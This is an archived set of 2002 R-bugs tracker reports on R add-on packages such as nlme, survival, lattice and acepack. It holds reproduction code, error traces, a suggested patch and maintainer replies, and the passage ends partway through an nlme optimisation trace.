> Brian D. Ripley,                  ripley@stats.ox.ac.uk
> Professor of Applied Statistics,  http://www.stats.ox.ac.uk/~ripley/
> University of Oxford,             Tel:  +44 1865 272861 (self)
> 1 South Parks Road,                     +44 1865 272860 (secr)
> Oxford OX1 3TG, UK                Fax:  +44 1865 272595
> 
>
-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-
> r-devel mailing list -- Read http://www.ci.tuwien.ac.at/~hornik/R/R-FAQ.html
> Send "info", "help", or "[un]subscribe"
> (in the "body", not the subject !)  To: r-devel-request@stat.math.ethz.ch
>
_._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._


__________________________________________________
Do You Yahoo!?
Sign up for SBC Yahoo! Dial - First Month Free
http://sbc.yahoo.com

==> 1729.audit <==
Tue Jul  2 21:14:42 2002	ripley	moved from incoming to Add-ons
Sun Aug 25 11:58:22 2002	ripley	changed notes
Sun Aug 25 11:58:22 2002	ripley	foobar
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 1741 *
Subject: groupedData constructor from a function
From: dieter.menne@menne-biomed.de
Date: Thu, 4 Jul 2002 15:59:59 +0200 (MET DST)
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 1741 <==
From dieter.menne@menne-biomed.de  Thu Jul  4 16:00:01 2002
Received: from blueberry (blueberry [192.38.19.4])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id PAA17348
	for <R-bugs@biostat.ku.dk>; Thu, 4 Jul 2002 15:59:59 +0200 (MET DST)
Date: Thu, 4 Jul 2002 15:59:59 +0200 (MET DST)
From: dieter.menne@menne-biomed.de
Message-Id: <200207041359.PAA17348@pubhealth.ku.dk>
To: R-bugs@biostat.ku.dk
Subject: groupedData constructor from a function

Full_Name: Dieter Menne
Version: 1.5.1
OS: win2000
Submission from: (NULL) (212.185.252.139)


Package nlme, version 3.1-27 (but also in earlier)
Calling the groupedData constructor from a function may fail if the formula 
is not passed explicitely. Below a suggested patch 

Suggestions for patches are in the archives, by Thomas Lumley and saikat.
# http://finzi.psych.upenn.edu/R/Rhelp/archive/2250.html
Both are essentially correct, but probably untested (typos).

library(nlme)
data(Oxboys)
# make it a non-grouped data frame
ox<-as.data.frame(Oxboys)

# Changed by DM. See also
# http://finzi.psych.upenn.edu/R/Rhelp/archive/2250.html
# but there were a few typos in there
groupedData<-
function (formula, data = sys.parent(1), order.groups = TRUE, 
    FUN = function(x) max(x, na.rm = TRUE), outer = NULL, inner = NULL, 
    labels = NULL, units = NULL) 
{
    if (!(inherits(formula, "formula") && length(formula) == 
        3)) {
        stop("first argument to groupedData must be a two-sided formula")
    }
    if (is.null(grpForm <- getGroupsFormula(formula, asList = TRUE))) {
        stop("Right hand side of first argument must be a conditional
expression")
    }
    ## patched part follow (may not work with S)
    mCall <- match.call()
    if (length(grpForm) == 1) {
      mCall[[1]] <- as.name("nfGroupedData") 
      eval(mCall, envir = parent.frame()) 
    }
    else {
      mCall[[1]] <- as.name("nmGroupedData") 
      eval(mCall, envir = parent.frame()) 
    }
    #######
}
 
ProcessPar<-function(par)
{
  form1<-as.formula(paste(par,"~age|Subject"))
  oxg3<-groupedData(formula=form1, data=ox)
  # Do processing with 
  print(str(oxg3))
}


# Works only with the patch to groupedData constructor
ProcessPar("height")



==> 1741.audit <==
Thu Jul  4 20:02:01 2002	ripley	moved from incoming to Add-ons
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 1972 *
Subject: lattice install
From: robert.king@newcastle.edu.au
Date: Mon, 2 Sep 2002 04:55:41 +0200 (MET DST)
--Perhaps lattice should require(grid) and print a clearer message?
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 1972 <==
From robert.king@newcastle.edu.au  Mon Sep  2 04:55:43 2002
Received: from blueberry (blueberry [192.38.19.4])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id EAA26744
	for <R-bugs@biostat.ku.dk>; Mon, 2 Sep 2002 04:55:41 +0200 (MET DST)
Date: Mon, 2 Sep 2002 04:55:41 +0200 (MET DST)
From: robert.king@newcastle.edu.au
Message-Id: <200209020255.EAA26744@pubhealth.ku.dk>
To: R-bugs@biostat.ku.dk
Subject: lattice install

Full_Name: Robert King
Version: 1.3
OS: windows
Submission from: (NULL) (134.148.4.19)


This looks like a problem with package dependencies.  Should be sending this to
the 
package author, not r-bugs?


An attempt to install lattice from the windows binary runs OK, but attempting to
load the library an error occurs:

> install.packages("D:/Software/R/lattice.zip", .lib.loc[1], CRAN = NULL)
updating HTML package descriptions
> library(lattice)
Error in parse(file, n, text, prompt) : syntax error on line 2022

I then tried installing under linux with R 1.5.1

This installed OK, but loading the library gave another error:

> library(lattice)
Error in library(grid) : There is no package called `grid'

Installing grid on linux resulted in lattice loading and working properly

Installing grid also fixed the problem on windows.



==> 1972.audit <==
Tue Sep  3 19:47:36 2002	thomas	changed notes
Tue Sep  3 19:47:36 2002	thomas	foobar
Tue Sep  3 19:47:36 2002	thomas	moved from incoming to Graphics
Wed Jan  8 11:27:36 2003	ripley	foobar
Wed Jan  8 11:27:36 2003	ripley	moved from Graphics to Add-ons
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 1974 *
Subject: Rwave installation problem
From: ld-temp-qt3i@pobox.com
Date: Mon, 2 Sep 2002 09:27:36 +0200 (MET DST)
--Instead, this should use ISO C headers, namely <stdlib.h>
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 1974 <==
From ld-temp-qt3i@pobox.com  Mon Sep  2 09:27:37 2002
Received: from blueberry (blueberry [192.38.19.4])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id JAA27886
	for <R-bugs@biostat.ku.dk>; Mon, 2 Sep 2002 09:27:36 +0200 (MET DST)
Date: Mon, 2 Sep 2002 09:27:36 +0200 (MET DST)
From: ld-temp-qt3i@pobox.com
Message-Id: <200209020727.JAA27886@pubhealth.ku.dk>
To: R-bugs@biostat.ku.dk
Subject: Rwave installation problem

Full_Name: Linc Davis
Version: 1.5.1
OS: Mac OS 10.1.5
Submission from: (NULL) (68.4.90.94)


When running install.packages("Rwave") as root, I got this error:

In file included from compinteg.c:12:
kernel.h:22: malloc.h: No such file or directory
make: *** [compinteg.o] Error 1
ERROR: compilation failed for package 'Rwave'

There are 3 header files 'malloc.h' in Mac OS X: one for generic C, one for
Objective-C, and a private one for the OS. The R installation script looks for C
headers in /usr/include, but the actual path to this one is

/usr/include/sys/malloc.h

I worked around the problem by copying the file as indicated, then I deleted the
copy after compiling the package. To fix the bug, the script should be changed
to look for C headers in both /usr/include and /usr/include/sys.

Thanks.

==> 1974.audit <==
Tue Sep 17 11:20:29 2002	maechler	foobar
Tue Sep 17 11:20:29 2002	maechler	moved from incoming to Add-ons
Wed Nov 20 16:44:15 2002	ripley	changed notes
Wed Nov 20 16:44:15 2002	ripley	foobar
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 2173 *
Subject: xlim in plot.survfit() [with a discussion on "..."]
From: jerome@hivnet.ubc.ca
Date: Wed, 16 Oct 2002 18:46:11 +0200 (MET DST)
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 2173 <==
From jerome@hivnet.ubc.ca  Wed Oct 16 18:46:12 2002
Received: from blueberry (blueberry [192.38.19.4])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id SAA00603
	for <R-bugs@biostat.ku.dk>; Wed, 16 Oct 2002 18:46:11 +0200 (MET DST)
Date: Wed, 16 Oct 2002 18:46:11 +0200 (MET DST)
From: jerome@hivnet.ubc.ca
Message-Id: <200210161646.SAA00603@pubhealth.ku.dk>
To: R-bugs@biostat.ku.dk
Subject: xlim in plot.survfit() [with a discussion on "..."]

Full_Name: Jerome Asselin
Version: 1.6.0
OS: RedHat 7.2
Submission from: (NULL) (24.83.203.63)



Hello,

I am trying to draw a legend on top of survival curves using
plot.survfit(). As in the example below, I would like to
specify a large interval for the x-axis. I can achieve such
result using "xlim". However, an error occurs if I use the
legend.pos and legend.text parameters as well.

  library(survival)
  TIME  <- Surv(c(23,52,12,56,23,21),c(T,F,T,F,F,T))

  par(mfrow=c(2,1))
  plot(survfit(TIME~1),conf.int=F,xlim=c(0,100),
  main="xlim=c(0,100) without legend")
  plot(survfit(TIME~1),conf.int=F,xlim=c(0,100),
  legend.pos=0,legend.text="Survival Curve",
  main="xlim=c(0,100) with legend (ERROR!)")

It looks like plot.survfit() attempts to send the "xlim"
parameter to legend(), which does not accept "xlim" as a
parameter. Hence, an error occurs and the legend is not
plotted.

I believe the problem is due to the fact that the
additional parameters "..." that are supplied to
plot.survfit() do not necessarily match the range of
possible parameters for both plot() and legend(). In my
case, "xlim" is matched by plot(), but not by legend().

I know how to plot the legend by directly using the
legend() function. However, in order to correct the
small problem with plot.survfit(), I would suggest that
plot.survfit() be modified to perform an exact match of
the parameters in "..." onto legend(). Perhaps there is
already a function to perform such a task. If not, I
believe it could provide a practical solution for
dealing with "..." and subfunctions that do not have a
built-in "..." parameter. That's just a suggestion,
though.

Thank you very much!
Jerome Asselin


==> 2173.audit <==
Wed Oct 16 22:58:03 2002	ripley	moved from incoming to Add-ons
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 2320 *
Subject: Segmentation fault using "survival" package
From: jerome@hivnet.ubc.ca
Date: Sat, 23 Nov 2002 00:51:50 +0100 (MET)
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 2320 <==
From jerome@hivnet.ubc.ca  Sat Nov 23 00:51:50 2002
Received: from blueberry (blueberry [192.38.19.4])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id AAA14015
	for <R-bugs@biostat.ku.dk>; Sat, 23 Nov 2002 00:51:50 +0100 (MET)
Date: Sat, 23 Nov 2002 00:51:50 +0100 (MET)
From: jerome@hivnet.ubc.ca
Message-Id: <200211222351.AAA14015@pubhealth.ku.dk>
To: R-bugs@biostat.ku.dk
Subject: Segmentation fault using "survival" package

Full_Name: Jerome Asselin
Version: 1.6.1
OS: RedHat Linux 7.2
Submission from: (NULL) (142.103.173.179)



Hello,

I get a segmentation fault when I run the following code. I wouldn't expect
meaningful results because my response variable contains only missing values.
However, I would expect something like a regular error (not a segmentation
fault).


library(survival)

data <- structure(list(surv = structure(c(NA, NA, NA, 0,
0, 0), .Dim = c(3, 2), .Dimnames = list(NULL, c("time", "status"
)), class = "Surv", type = "right"), x = c(-1, -1, -0.5)),
.Names = c("surv", "x"),row.names = c("1", "2", "3"),
class = "data.frame")

coxph(surv ~ x,data=data)


Below is what I get when I run these commands from a freshly started R session.
This is always reproducible for me.

Sincerely,
Jerome Asselin

> library(survival)
>
> data <- structure(list(surv = structure(c(NA, NA, NA, 0,
+ 0, 0), .Dim = c(3, 2), .Dimnames = list(NULL, c("time", "status"
+ )), class = "Surv", type = "right"), x = c(-1, -1, -0.5)),
+ .Names = c("surv", "x"),row.names = c("1", "2", "3"),
+ class = "data.frame")
>
> coxph(surv ~ x,data=data)
Segmentation fault



==> 2320.reply.1 <==
From maechler@stat.math.ethz.ch  Mon Nov 25 09:20:40 2002
Received: from hypatia.math.ethz.ch (root@hypatia.ethz.ch [129.132.58.23])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id JAA22274
	for <R-bugs@biostat.ku.dk>; Mon, 25 Nov 2002 09:20:39 +0100 (MET)
Received: from lynne.ethz.ch (IDENT:root@lynne [129.132.58.30])
	by hypatia.math.ethz.ch (8.12.6/8.12.6) with ESMTP id gAP8JqXE013118;
	Mon, 25 Nov 2002 09:19:52 +0100 (MET)
Received: (from maechler@localhost)
	by lynne.ethz.ch (8.11.6/8.11.2) id gAP8JqQ21717;
	Mon, 25 Nov 2002 09:19:52 +0100
From: Martin Maechler <maechler@stat.math.ethz.ch>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Message-ID: <15841.56616.8240.257467@gargle.gargle.HOWL>
Date: Mon, 25 Nov 2002 09:19:52 +0100
To: jerome@hivnet.ubc.ca
Cc: R-bugs@biostat.ku.dk
Subject: Re: [Rd] Segmentation fault using "survival" package (PR#2320)
In-Reply-To: <200211222351.AAA14020@pubhealth.ku.dk>
References: <200211222351.AAA14020@pubhealth.ku.dk>
X-Mailer: VM 7.07 under Emacs 21.2.1
Reply-To: Martin Maechler <maechler@stat.math.ethz.ch>

>>>>> "Jerome" == Jerome Asselin <jerome@hivnet.ubc.ca>
>>>>>     on Sat, 23 Nov 2002 00:51:51 +0100 (MET) writes:

    Jerome> Full_Name: Jerome Asselin Version: 1.6.1 OS: RedHat
    Jerome> Linux 7.2 Submission from: (NULL) (142.103.173.179)


    Jerome> Hello,

    Jerome> I get a segmentation fault when I run the following
    Jerome> code. I wouldn't expect meaningful results because
    Jerome> my response variable contains only missing values.
    Jerome> However, I would expect something like a regular
    Jerome> error (not a segmentation fault).

I confirm the problem (OS: a version of Redhat Linux, 1.6.1 patched)
running in "R -d gdb"
shows the place :

> coxph(surv ~ x, data=data)

Program received signal SIGSEGV, Segmentation fault.
0x4027dee4 in coxfit2 (maxiter=0x8c9cc60, nusedx=0x8c9cc40, nvarx=0x8c9cc20, 
    time=0x0, status=0x0, covar2=0x0, offset=0x0, weights=0x0, strata=0x0, 
    means=0x8c85738, Rf_beta=0x8c85710, u=0x8c856e8, imat2=0x8c856c0, 
    loglik=0x8cb3dd0, flag=0x8c9cc00, work=0x8b4ef10, eps=0x8c85698, 
    tol_chol=0x8c85670, sctest=0x8c85648) at coxfit2.c:116
116	coxfit2.c: No such file or directory.
	in coxfit2.c

--
Martin

==> 2320.audit <==
Mon Nov 25 21:13:18 2002	thomas	moved from incoming to Add-ons
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 2322 *
Subject: simplex
From: george@lecompte.org
Date: Sat, 23 Nov 2002 17:30:37 +0100 (MET)
--report on boot, I think (not mentioned, though)
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 2322 <==
From george@lecompte.org  Sat Nov 23 17:30:38 2002
Received: from blueberry (blueberry [192.38.19.4])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id RAA16415
	for <R-bugs@biostat.ku.dk>; Sat, 23 Nov 2002 17:30:37 +0100 (MET)
Date: Sat, 23 Nov 2002 17:30:37 +0100 (MET)
From: george@lecompte.org
Message-Id: <200211231630.RAA16415@pubhealth.ku.dk>
To: R-bugs@biostat.ku.dk
Subject: simplex

Full_Name: George LeCompte
Version: 1.6.1 (windows)
OS: windows98
Submission from: (NULL) (208.8.162.135)


simplex won't work with only >= constraints examples follow:

this works:
simplex(a=1,A1=1,b1=10,A2=1,b2=1)

but this doesn't
simplex(1,A2=1,b2=1)

Linear Programming Results

Call : simplex(a = 1, A2 = 1, b2 = 1)

Minimization Problem with Objective Function Coefficients
x1 
 1 

No feasible solution could be found


==> 2322.audit <==
Tue Nov 26 21:45:55 2002	ripley	changed notes
Tue Nov 26 21:45:55 2002	ripley	foobar
Tue Nov 26 21:45:55 2002	ripley	moved from incoming to Add-ons
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 2352 *
Subject: avas: segmentation fault on empty args
From: vograno@arbitrade.com
Date: Fri, 6 Dec 2002 19:41:48 +0100 (MET)
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 2352 <==
From vograno@arbitrade.com  Fri Dec  6 19:41:49 2002
Received: from blueberry (blueberry [192.38.19.4])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id TAA11396
	for <R-bugs@biostat.ku.dk>; Fri, 6 Dec 2002 19:41:48 +0100 (MET)
Date: Fri, 6 Dec 2002 19:41:48 +0100 (MET)
From: vograno@arbitrade.com
Message-Id: <200212061841.TAA11396@pubhealth.ku.dk>
To: R-bugs@biostat.ku.dk
Subject: avas: segmentation fault on empty args

Full_Name: Vadim Ogranovich
Version: 1.6.0
OS: Red Hat 7.1
Submission from: (NULL) (209.99.241.1)


Segmentation fault occurs when empty vectors passed to avas as arguments. 

> library("acepack")
library("acepack")
> avas(numeric(0),numeric(0))
avas(numeric(0),numeric(0))

Process R segmentation fault at Fri Dec  6 10:31:06 2002


==> 2352.audit <==
Sat Dec  7 09:32:42 2002	ripley	foobar
Sat Dec  7 09:32:42 2002	ripley	moved from incoming to Add-ons
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 2363 *
Subject: nlme() and parameters "model", "fixed" and "random"
From: jerome@hivnet.ubc.ca
Date: Wed, 11 Dec 2002 22:29:47 +0100 (MET)
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 2363 <==
From jerome@hivnet.ubc.ca  Wed Dec 11 22:29:48 2002
Received: from blueberry (blueberry [192.38.19.4])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id WAA17779
	for <R-bugs@biostat.ku.dk>; Wed, 11 Dec 2002 22:29:47 +0100 (MET)
Date: Wed, 11 Dec 2002 22:29:47 +0100 (MET)
From: jerome@hivnet.ubc.ca
Message-Id: <200212112129.WAA17779@pubhealth.ku.dk>
To: R-bugs@biostat.ku.dk
Subject: nlme() and parameters "model", "fixed" and "random"

Full_Name: Jerome Asselin
Version: 1.6.1
OS: linux redhat 7.2
Submission from: (NULL) (142.103.173.179)



print.lme() fails when the parameters "model", "fixed" and "random"
are input as objects in nlme(). To show how this occurs, below is a
slightly modified example from the nlme help page.


     library(nlme)
     data(Loblolly)
     fm1 <- nlme(height ~ SSasymp(age, Asym, R0, lrc),
                 data = Loblolly,
                 fixed = Asym + R0 + lrc ~ 1,
                 random = Asym ~ 1,
                 start = c(Asym = 103, R0 = -8.5, lrc = -3.3))
     fm1 # THIS WORKS...

     model <- height ~ SSasymp(age, Asym, R0, lrc)
     fixed <- Asym + R0 + lrc ~ 1
     random <- Asym ~ 1
     start <- c(Asym = 103, R0 = -8.5, lrc = -3.3)
     fm2 <- nlme(model,
                 data = Loblolly,
                 fixed = fixed,
                 random = random,
                 start = start)
     fm2 # ERROR
     #Nonlinear mixed-effects model fit by maximum likelihood
     #Error in as.vector(x, mode) : cannot coerce to vector

     all(unlist(fm1$coefficients)==unlist(fm2$coefficients)) # TRUE


==> 2363.followup.1 <==
From ldimitro@wfubmc.edu  Wed Dec 11 22:46:06 2002
Received: from EXCHVS1.medctr.ad.wfubmc.edu (exchvs1.medctr.ad.wfubmc.edu [152.11.200.72] (may be forged))
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id WAA17860
	for <R-bugs@biostat.ku.dk>; Wed, 11 Dec 2002 22:46:05 +0100 (MET)
X-MimeOLE: Produced By Microsoft Exchange V6.0.6249.0
content-class: urn:content-classes:message
MIME-Version: 1.0
Content-Type: text/plain;
	charset="us-ascii"
Subject: RE: [Rd] nlme() and parameters "model", "fixed" and "random" (PR#2363)
Date: Wed, 11 Dec 2002 16:44:47 -0500
Message-ID: <F160BE32A2E5E04497668BBDFE83FEDF0350F764@EXCHVS1.medctr.ad.wfubmc.edu>
X-MS-Has-Attach: 
X-MS-TNEF-Correlator: 
Thread-Topic: [Rd] nlme() and parameters "model", "fixed" and "random" (PR#2363)
Thread-Index: AcKhXMAhzsOqe3+3T4yz9XYAcwrlWwAAcfWA
From: "Latchezar Dimitrov" <ldimitro@wfubmc.edu>
To: <r-devel@stat.math.ethz.ch>
Cc: <R-bugs@biostat.ku.dk>
Content-Transfer-Encoding: 8bit
X-MIME-Autoconverted: from quoted-printable to 8bit by pubhealth.ku.dk id WAA17860

The same in Windows XP Pro

Latchezar Dimitrov

> -----Original Message-----
> From: jerome@hivnet.ubc.ca [mailto:jerome@hivnet.ubc.ca] 
> Sent: Wednesday, December 11, 2002 4:30 PM
> To: r-devel@stat.math.ethz.ch
> Cc: R-bugs@biostat.ku.dk
> Subject: [Rd] nlme() and parameters "model", "fixed" and 
> "random" (PR#2363)
> 
> 
> Full_Name: Jerome Asselin
> Version: 1.6.1
> OS: linux redhat 7.2
> Submission from: (NULL) (142.103.173.179)
> 
> 
> 
> print.lme() fails when the parameters "model", "fixed" and 
> "random" are input as objects in nlme(). To show how this 
> occurs, below is a slightly modified example from the nlme help page.
> 
> 
>      library(nlme)
>      data(Loblolly)
>      fm1 <- nlme(height ~ SSasymp(age, Asym, R0, lrc),
>                  data = Loblolly,
>                  fixed = Asym + R0 + lrc ~ 1,
>                  random = Asym ~ 1,
>                  start = c(Asym = 103, R0 = -8.5, lrc = -3.3))
>      fm1 # THIS WORKS...
> 
>      model <- height ~ SSasymp(age, Asym, R0, lrc)
>      fixed <- Asym + R0 + lrc ~ 1
>      random <- Asym ~ 1
>      start <- c(Asym = 103, R0 = -8.5, lrc = -3.3)
>      fm2 <- nlme(model,
>                  data = Loblolly,
>                  fixed = fixed,
>                  random = random,
>                  start = start)
>      fm2 # ERROR
>      #Nonlinear mixed-effects model fit by maximum likelihood
>      #Error in as.vector(x, mode) : cannot coerce to vector
> 
>      all(unlist(fm1$coefficients)==unlist(fm2$coefficients)) # TRUE
> 
> ______________________________________________
> R-devel@stat.math.ethz.ch mailing list 
> http://www.stat.math.ethz.ch/mailman/listin> fo/r-devel
> 

==> 2363.reply.1 <==
From bates@bates5.stat.wisc.edu  Wed Dec 11 22:54:46 2002
Received: from bates5.stat.wisc.edu (mail@bates5.stat.wisc.edu [128.105.174.135])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id WAA17891
	for <R-bugs@biostat.ku.dk>; Wed, 11 Dec 2002 22:54:45 +0100 (MET)
Received: from bates by bates5.stat.wisc.edu with local (Exim 3.36 #1 (Debian))
	id 18MEnW-0001n8-00; Wed, 11 Dec 2002 15:53:42 -0600
To: jerome@hivnet.ubc.ca
Cc: r-devel@stat.math.ethz.ch, R-bugs@biostat.ku.dk
Subject: Re: [Rd] nlme() and parameters "model", "fixed" and "random" (PR#2363)
References: <200212112129.WAA17784@pubhealth.ku.dk>
From: Douglas Bates <bates@stat.wisc.edu>
Date: 11 Dec 2002 15:53:41 -0600
In-Reply-To: <200212112129.WAA17784@pubhealth.ku.dk>
Message-ID: <6rbs3skysa.fsf@bates5.stat.wisc.edu>
Lines: 42
User-Agent: Gnus/5.0808 (Gnus v5.8.8) XEmacs/21.4 (Common Lisp)
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Sender: Douglas Bates <bates@bates5.stat.wisc.edu>

jerome@hivnet.ubc.ca writes:

> Full_Name: Jerome Asselin
> Version: 1.6.1
> OS: linux redhat 7.2
> Submission from: (NULL) (142.103.173.179)
> 
> 
> 
> print.lme() fails when the parameters "model", "fixed" and "random"
> are input as objects in nlme(). To show how this occurs, below is a
> slightly modified example from the nlme help page.
> 
> 
>      library(nlme)
>      data(Loblolly)
>      fm1 <- nlme(height ~ SSasymp(age, Asym, R0, lrc),
>                  data = Loblolly,
>                  fixed = Asym + R0 + lrc ~ 1,
>                  random = Asym ~ 1,
>                  start = c(Asym = 103, R0 = -8.5, lrc = -3.3))
>      fm1 # THIS WORKS...
> 
>      model <- height ~ SSasymp(age, Asym, R0, lrc)
>      fixed <- Asym + R0 + lrc ~ 1
>      random <- Asym ~ 1
>      start <- c(Asym = 103, R0 = -8.5, lrc = -3.3)
>      fm2 <- nlme(model,
>                  data = Loblolly,
>                  fixed = fixed,
>                  random = random,
>                  start = start)
>      fm2 # ERROR
>      #Nonlinear mixed-effects model fit by maximum likelihood
>      #Error in as.vector(x, mode) : cannot coerce to vector
> 
>      all(unlist(fm1$coefficients)==unlist(fm2$coefficients)) # TRUE

Thanks for the report.  The construction deparse(as.vector(x)) where x
is a formula is needed in S-PLUS but can cause an error in R.  We
should, and will, revise the R package for nlme to replace any
instances of deparse(as.vector(x)) by deparse(x).

==> 2363.audit <==
Fri Dec 13 08:28:56 2002	ripley	foobar
Fri Dec 13 08:28:56 2002	ripley	moved from incoming to Add-ons
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 2369 *
Subject: convergence problem with nlme()
From: jerome@hivnet.ubc.ca
Date: Thu, 12 Dec 2002 23:43:14 +0100 (MET)
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 2369 <==
From jerome@hivnet.ubc.ca  Thu Dec 12 23:43:15 2002
Received: from blueberry (blueberry [192.38.19.4])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id XAA27889
	for <R-bugs@biostat.ku.dk>; Thu, 12 Dec 2002 23:43:14 +0100 (MET)
Date: Thu, 12 Dec 2002 23:43:14 +0100 (MET)
From: jerome@hivnet.ubc.ca
Message-Id: <200212122243.XAA27889@pubhealth.ku.dk>
To: R-bugs@biostat.ku.dk
Subject: convergence problem with nlme()

Full_Name: Jerome Asselin
Version: 1.6.1
OS: linux redhat 7.2
Submission from: (NULL) (142.103.173.179)



I am using the nlme package version 3.1-33.

I tried an example from the file "library/nlme/scripts/ch08.R" that comes
with the nlme package but I did not obtain convergence. I assume that
this example worked at some point in the past, but I cannot determine
why it is not working anymore. So I am unable to determine whether this
is a numerical bug or a documentation bug (in the file "ch08.R").

More specifically, I tried the example below (in which I added the
option msVerbose=T.)

library(nlme)
data(Quinidine)
control <- nlmeControl(msVerbose = T)
fm1Quin.nlme <-
  nlme(conc ~ quinModel(Subject, time, conc, dose, interval,
                        lV, lKa, lCl),
       data = Quinidine, fixed = lV + lKa + lCl ~ 1,
       random = pdDiag(lV + lCl ~ 1), groups =  ~ Subject,
       start = list(fixed = c(5, -0.3, 2)),
       na.action = NULL, naPattern =  ~ !is.na(conc), control = control)
#Error in nlme.formula(conc ~ quinModel(Subject, time, conc, dose, interval,  :
#        Maximum number of iterations reached without convergence

Below is the trace of the calculations by nlme().


iteration = 0
Step:
[1] 0 0
Parameter:
[1] 0.9645714 1.2393630
Function Value
[1] 1053.026
Gradient:
[1] -5.1732725 -0.3194242

iteration = 10
Parameter:
[1] 5.492493 1.275746
Function Value
[1] 1050.678
Gradient:
[1] -0.0004125939  0.0012034419

Iteration limit exceeded.  Algorithm failed.

iteration = 0
Step:
[1] 0 0
Parameter:
[1] 5.492303 0.860876
Function Value
[1] 1047.32
Gradient:
[1]  8.080429e-04 -8.308982e-06

iteration = 6
Parameter:
[1] -1772.4732661     0.3624312
Function Value
[1] 815.6329
Gradient:
[1]  9.726484e-25 -2.590048e-08

Successive iterates within tolerance.
Current iterate is probably solution.

iteration = 0
Step:
[1] 0 0
Parameter:
[1] 0.7142093 0.8328863
Function Value
[1] 1045.966
Gradient:
[1] -2.701254  1.837528

iteration = 6
Parameter:
[1] 1.1387817 0.8237138
Function Value
[1] 1045.492
Gradient:
[1] -3.297258e-08  4.558449e-08

Successive iterates within tolerance.
Current iterate is probably solution.

iteration = 0
Step:
[1] 0 0
Parameter:
[1] 1.2190786 0.8233033
Function Value
[1] 1044.609
Gradient:
[1]  2.589381 -2.443006

iteration = 7
Parameter:
[1] 0.6880674 0.8342263
Function Value
[1] 1043.658
Gradient:
[1] -5.457107e-08 -1.710382e-06

Successive iterates within tolerance.
Current iterate is probably solution.

iteration = 0
Step:
[1] 0 0
Parameter:
[1] 0.6867763 0.8348800
Function Value
[1] 1045.262
Gradient:
[1] -3.318076  2.320207

iteration = 7
Parameter:
[1] 1.2547275 0.8239144
Function Value
[1] 1044.541
Gradient:
[1]  1.496284e-08 -6.761539e-21

Successive iterates within tolerance.
Current iterate is probably solution.

iteration = 0
Step:
[1] 0 0
Parameter:
[1] 1.2661227 0.8244986
Function Value
[1] 1044.441
Gradient:
[1]  2.642391 -2.502298

iteration = 1
Parameter:
[1] -1509.6490716     0.8231054
Function Value
[1] 826.5788
Gradient:
[1] 5.044484e-19 3.488575e+01

Maximum step size exceeded 5 consecutive times.
Either the function is unbounded below,
becomes asymptotic to a finite value
from above in some direction,
or stepmx is too small.

iteration = 0
Step:
[1] 0 0
Parameter:
[1] 0.6851074 0.8350764
Function Value
[1] 1045.189
Gradient:
[1] -3.359032  2.357977

iteration = 7
Parameter:
[1] 1.2648770 0.8239819
Function Value
[1] 1044.448
Gradient:
[1] -1.484278e-08 -4.556966e-08

Last global step failed to locate a point lower than x.
Either x is an approximate local minimum of the function,
the function is too non-linear for this algorithm,
or steptol is too large.

iteration = 0
Step:
[1] 0 0
Parameter:
[1] 1.2679928 0.8245302
Function Value
[1] 1044.427
Gradient:
[1]  2.646834 -2.508039

iteration = 1
Parameter:
[1] -1511.23183     0.82312
Function Value
[1] 826.1627
Gradient:
[1] 1.373859e-18 3.405617e+01

Maximum step size exceeded 5 consecutive times.
Either the function is unbounded below,
becomes asymptotic to a finite value
from above in some direction,
or stepmx is too small.

iteration = 0
Step:
[1] 0 0
Parameter:
[1] 0.6849866 0.8350863
Function Value
[1] 1045.184
Gradient:
[1] -3.361700  2.360219

iteration = 7
Parameter:
[1] 1.2654792 0.8239847
Function Value
[1] 1044.442
Gradient:
[1] -1.483571e-08 -2.278475e-08

Successive iterates within tolerance.
Current iterate is probably solution.

iteration = 0
Step:
[1] 0 0
Parameter:
[1] 1.268088 0.824533
Function Value
[1] 1044.426
Gradient:
[1]  2.647101 -2.508261

iteration = 1
Parameter:
[1] -1511.3133956     0.8231232
Function Value
[1] 827.7616
Gradient:
[1] 1.046018e-18 3.410108e+01

Maximum step size exceeded 5 consecutive times.
Either the function is unbounded below,
